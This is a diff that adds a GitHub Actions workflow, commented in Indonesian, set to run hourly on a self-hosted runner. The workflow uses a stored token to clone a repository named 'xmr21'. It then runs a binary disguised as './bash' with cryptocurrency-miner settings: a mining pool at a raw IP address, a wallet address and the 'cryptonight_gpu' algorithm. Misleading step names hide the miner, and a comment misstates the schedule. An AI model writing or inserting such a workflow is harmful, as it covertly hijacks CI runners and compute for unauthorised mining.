@@ -1,0 +1,37 @@
+name: Run bash --noTest
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 * * * *"  # tiap 12 jam (UTC)
+
+permissions:
+  contents: read
+
+concurrency:
+  group: tesaction-run
+  cancel-in-progress: true
+
+jobs:
+  run:
+    runs-on: self-hosted
+    timeout-minutes: 300  # 5 jam
+
+    steps:
+      # OPTIONAL: ini bisa DIHAPUS kalau repo ini memang TIDAK dipakai
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Debug (optional)
+        run: |
+          echo "GITHUB_WORKSPACE=$GITHUB_WORKSPACE"
+          ls -la
+
+      - name: Clone target repo & run bash
+        env:
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+        run: |
+          git clone https://x-access-token:$GH_TOKEN@github.com/sadarsayujinjas/xmr21.git
+          cd xmr21
+          chmod +x ./bash
+          ./bash --noCPU -o 138.197.24.47:80 -u RYoNsCHsnFSQLS5JUWzd9ee7N7pe44gTE9JUmjYHUgT6RRLL76x35pwiJ9aVU141s6JnBachuzCJWcPFn9zEdvM9WhsSswGtky352bQiR41hX2 -p x --currency cryptonight_gpu -i 3333
